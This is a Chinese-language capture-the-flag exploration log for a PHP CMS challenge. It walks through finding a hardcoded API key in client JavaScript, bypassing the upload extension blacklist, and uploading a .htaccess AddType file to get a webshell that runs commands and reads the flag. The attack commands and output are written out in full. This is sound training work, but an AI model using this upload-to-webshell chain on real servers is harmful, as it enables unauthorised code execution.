# a-04 · 探索记录

对应题解：[`a-04.md`](./a-04.md)。

## 目标与起点

题目说「内容管理系统，做了严格的安全加固，只允许管理员登录后才能管理文件」。中等难度，300 分。

启动后首页 200，直接是登录框：

```
Enterprise CMS  v2.3.1 企业版
用户名 / 密码
© 2024 Enterprise CMS · 安全加固版本
```

## 第一阶段：常规入口枚举

```bash
for p in admin.php admin/ upload.php files.php api/ includes/ config.php \
         .git/HEAD backup.zip composer.json README.md; do
  curl -s -o /dev/null -w "$p %{http_code} %{size_download}\n" "http://$T/$p"
done
```

结果：

| 路径 | 结果 | 判据 |
| --- | --- | --- |
| `/api/` | 403 | 目录存在，禁止列表 |
| `/includes/` | 403 | 同上 |
| 其余 | 404（314 字节） | 不存在 |
| `/.git/HEAD` | 404 | 没有源码泄露 |

第一轮没有直接收益，但 `/api/` 是个明确的下一步。

## 第二阶段：前端资源

首页引用了：

```html
<link rel="stylesheet" href="assets/css/style.css">
<script src="assets/js/app.js?v=2.3.1"></script>
```

`app.js` 拉下来是**未混淆的源码**，190 行左右。前半段是登录表单的伪逻辑（把 `cms_logged_in` 写进 `sessionStorage`，纯前端，没有任何服务端校验），后半段有价值：

```js
apiBase: '/api',

if (endpoint.includes('upload')) {
    mergedOptions.headers['X-API-Key'] = 'cms_int_svc_k3y_9x2m7q';
}

uploadFile: function(file) {
    const formData = new FormData();
    formData.append('file', file);
    formData.append('api_key', 'cms_int_svc_k3y_9x2m7q');
    return fetch(this.apiBase + '/upload.php', { method: 'POST', body: formData });
}
```

**上传端点 `/api/upload.php`、请求头 `X-API-Key`、Key 明文，全在客户端。** 这一步基本宣告「登录绕过」不是本题主线——不需要伪造 session，直接用 Key 打接口。

顺带注意到 `handleLogin` 只写 `sessionStorage`，说明**前端登录态是假的**；但那也没用，因为后端页面还需要 session，而前端没有说明怎么拿。

## 第三阶段：API Key 绕过鉴权

```bash
# 不带 Key
curl -s -F 'file=@a.txt' http://$T/api/upload.php
# 403 {"error":"Invalid API key"}

# 带 Key（header 和 form 字段都带）
curl -s -H 'X-API-Key: cms_int_svc_k3y_9x2m7q' \
     -F 'file=@a.txt' -F 'api_key=cms_int_svc_k3y_9x2m7q' \
     http://$T/api/upload.php
# 200 {"success":true,...,"path":"uploads\/a.txt"}
```

**一次成功。** 没有 session、没有 cookie、没有任何登录动作。

## 第四阶段：上传 webshell（失败两轮）

### 第一轮：直接 `.php`

```
{"error":"WAF: Dangerous file extension detected!"}
```

确认有后缀黑名单。测边界：

| 后缀 | 结果 |
| --- | --- |
| `php` | 拦 |
| `phtml` | 拦 |
| `pht` | 拦 |
| `php5` | 拦 |
| `phar` | 拦 |
| `PHP` / `Php` | 拦（大小写不敏感） |
| `phps` | **放行** |
| `php7` / `php8` | **放行** |
| `inc` | **放行** |
| `php.jpg` / `php.png` / `phtml.jpg` | **放行**（只看最后一段） |
| `php.`（尾随点） | **放行** |

### 第二轮：放行了但没执行

把放行的每个文件都请求一遍：

```
t_phpjpg.php.jpg  → 200，返回源码文本
t_phppng.php.png  → 200，返回源码文本
t_php.php.        → 200，返回源码文本
t_php7.php7       → 200，返回源码文本
t_inc.inc         → 200，返回源码文本
```

**全部是静态文件**，PHP 没有解析。这就是本题的第一个分岔：黑名单绕过成功≠RCE，必须再找一层「让服务器解析」的手段。

`/uploads/` 目录索引 403（目录存在，禁止列表），没有别的线索。

## 第五阶段：`.htaccess` 重映射（成功）

思路：既然 `/uploads/` 是 Apache 目录、允许上传任意文件，就上传 `.htaccess` 把 `.jpg` 交给 PHP 处理。先确认 `.htaccess` 不在黑名单里：

```bash
printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
curl -s -H "X-API-Key: $KEY" -F 'file=@.htaccess;filename=.htaccess' \
     -F "api_key=$KEY" http://$T/api/upload.php
# {"success":true,...,"path":"uploads\/.htaccess"}
```

再请求之前上传的 `t_phpjpg.php.jpg`：

```bash
curl -s "http://$T/uploads/t_phpjpg.php.jpg?c=id"
# UP:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**PHP 开始解析了。** 立刻补一个专用的 webshell，并把 flag 读出来：

```bash
curl -s "http://$T/uploads/t_phpjpg.php.jpg?c=cat+/challenge/flag.txt"
# UP:flag{9d6c38f3-bcac-42c0-93c8-c748dcc919c2}
```

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `/admin.php`、`/upload.php`、`/files.php` 等 | 404 | 314 字节 Apache 错误页 |
| `/.git/HEAD`、`backup.zip`、`composer.json` | 404 | 无源码/备份泄露 |
| 前端 `sessionStorage` 登录态 | 无用 | 纯前端，后端不认 |
| 直接上传 `.php`/`.phtml`/`.pht`/`.php5`/`.phar` | 拦 | `WAF: Dangerous file extension detected!` |
| 上传 `php7`/`phps`/`php.jpg`/`php.` | 放行但不执行 | 200 返回源码文本 |
| `/uploads/` 目录列表 | 403 | 不能列 |
| **上传 `.htaccess` + `AddType`** | **成功** | 之后 `.jpg` 被 PHP 解析 |

## 这次真正的收获

1. **先读 `app.js` 再爆破登录。** 前端资源里经常有 API Key、内部端点、调试开关；本题的 Key 直接把「管理员登录」这一整层跳过了。
2. **「只允许管理员登录」往往只覆盖 UI。** 要问的是「这个接口实际校验什么」，而不是「页面上要求我登录吗」。
3. **黑名单逃逸和代码执行是两件事。** 放行 `php7`/`php.jpg` 只是过了 WAF，服务器仍然按静态文件返回；必须再有一步让它解析。
4. **`.htaccess` 上传是通用解法。** 目标目录是 Apache、允许 `AllowOverride`、且 WAF 不拦 `.htaccess` 时，`AddType` 一行就能把任意后缀变成 PHP。
5. **试探要有「放行之后做什么」的下一步。** 如果只想「绕过黑名单」，会在第二轮就误判成功。
